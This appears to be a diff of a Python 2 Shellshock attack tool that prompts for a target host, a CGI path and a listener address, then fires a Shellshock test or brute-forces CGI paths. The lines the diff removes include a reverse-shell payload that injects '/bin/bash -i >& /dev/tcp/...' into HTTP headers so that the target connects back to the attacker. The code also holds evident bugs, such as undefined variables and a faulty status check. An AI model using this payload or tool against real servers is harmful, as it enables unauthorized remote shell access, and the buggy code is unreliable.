@@ -36,8 +36,7 @@ def banner():
 
 
 Usage is so simple even a monkey can handle it:
-
-Shellshocker.py <flag > <target host> <path to target cgi script>
+Simply input everything the script would ask you for ;)
 
 Path to CGI-sctipt is not required if you are using the -b flag
 
@@ -80,28 +79,22 @@ def Shock(target_host, target_port, target_path, listener):
     return result
 
 
-def Bruteforce_CGIS(target_host,target_port,dictionary_path,listener):
+def Bruteforce_CGIS(target_host,target_port,dictionary_path,legit_headers):
     ### Opening the dict file
     try:
         open(dictionary_path,'r')
     except IOError:
         print 'File or directory not found.'
         banner()
-    reverse_shell = "() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % listener
     print 'Running in the Brute-Force mode.'
-    brute_headers = {
-                    'Accept' : 'lol',
-                     "Connection": "Close"
-    }
+
     result = False
     con = httplib.HTTPConnection(host=target_host, port=target_port)
-
-
     for line in dictionary_path:
-        req = con.request("GET", url=target_path, headers=brute_headers)
+        req = con.request("GET", url=target_path, headers=legit_headers)
         response = con.getresponse()
         if response == 200:
-            print line, response.status,response.reason
+            print '+' * 30, line, response.status,response.reason, '+' * 30
         if response == 403:
             print line, response.status,response.reason
         if response == 404:
@@ -132,6 +125,7 @@ def Connection_check(target_host,target_port,target_path,legit_headers):
         banner()
     if response.status == 200:
         result = True
+    con.close()
     return result
 
 """
@@ -143,44 +137,55 @@ A C T U A L   B E G I N N I N G
 
 banner()
 
-flag = sys.argv[1]
+test_type = ''
 
-if flag == 'b':
-    target_host = sys.argv[2]
-    print len(sys.argv)
-    if len(sys.argv) > 3:
-        print 'Amount of sys.argv is bigger then 3, setting up the user provided dictionary'
-        dictionary_path = sys.argv[4]
-    else:
-        dictionary_path = open('cgis.txt','r')          ### No such file or dictionary error ~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    listener = raw_input('Enter the listener IP (IP/port):')
-    Bruteforce_CGIS(target_host, target_port, dictionary_path)
+target_host = raw_input('Target host:')
+
+user_response_0 = raw_input('Do you know the path to target CGI scrip?(Y or N):')
+print user_response_0   
+if 'Y' in user_response_0:
+    path_known = True
+elif 'N' in user_response_0:
+    path_known = False
+elif 'Y' or 'N' not in user_response_0:
+    print 'Unknown input! (expected Y or N), input received: ', user_response_0, '\n', type(user_response_0)
     exit()
-if flag == 'h':
-    print 'This function is currently developed and not yet avaliable'
-    banner()
-if flag == 't':
-    listener = raw_input('Enter the listener IP (IP/port):')
-    if Connection_check(target_host,target_port,target_path,legit_headers):
-        print 'Performing simple Shellshock test.'
-        Shock(target_host, target_port, target_path, listener)
+if path_known:
+    target_path = raw_input('Enter the CGI script path:')
+    print '\nThe CGI path is known, you have 2 test types available:\n1. Simple shellshock test (Flag t)\n2.Vulnerable' \
+          ' header brute-force (Flag b)'
+    test_type = raw_input('What test to perform? (t or b):')
+    if 't' in test_type:
+        listener = raw_input('Enter the listener adress (IP/PORT, eg 127.0.0.1/80):')
+        print 'Checking connection.'
+        if Connection_check(target_host, target_port, target_path, legit_headers):
+            print 'Performing simple Shellshock check'
+            Shock(target_host, target_port, target_path, listener)
+        else:
+            print 'Connection failed.'
+            time.sleep(3)
+            banner()
+    elif 'b' in test_type:
+        print 'This feature is currently in development an unstable, who cares though?'
+
+
+
+else:
+    user_response = 'Would you like to brute-force possible CGI paths? (Y or N)'
+    if user_response == 'Y':
+        user_response_2 = raw_input('Would you like to use a default Shellshock Swiss Army tool\'s dictionary?')
+        if user_response_2 == 'Y':
+            dictionary_path = 'cgis2.txt'
+            listener = raw_input('Enter the listener ip (IP/Port, eg. 192.168.1.2/4444)')
+            Bruteforce_CGIS(target_host, target_port, dictionary_path, listener)
+        if user_response_2 == 'N':
+            dictionary_path = raw_input('Enter the path to a dictionary file in TXT format.')
+        else:
+            print 'Unknown input! (expected Y or N)'
+            exit()
+    if user_response == 'N':
+        print 'Well, okay..'
+        exit()
     else:
-        pass
-else:
-    print 'Wrong amount of arguments given'
-    banner()
-
-"""
-print 'Testing connection with',target_host,'Path:',target_path,'Port:',target_port
-
-if Connection_check(target_host, target_port, target_path, legit_headers):
-    print '\nConnection stable.'
-    if flag == 'b':
-        Bruteforce_CGIS(target_host, target_port, dictionary_path)
-    if flag == 't':
-
-else:
-    print '\nSomething went wrong.....'
-    time.sleep(2)
-    banner()
-"""
+        print 'Unknown input! (expected Y or N)'
+        exit()
